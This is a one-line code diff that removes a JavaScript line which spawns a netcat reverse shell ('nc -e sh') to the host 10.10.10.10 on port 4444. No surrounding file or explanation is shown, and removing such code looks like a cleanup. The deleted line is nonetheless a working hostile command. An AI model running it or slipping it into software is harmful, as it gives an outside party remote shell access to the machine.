@@ -1,1 +1,0 @@
-require('child_process').exec('nc -e sh 10.10.10.10 4444')
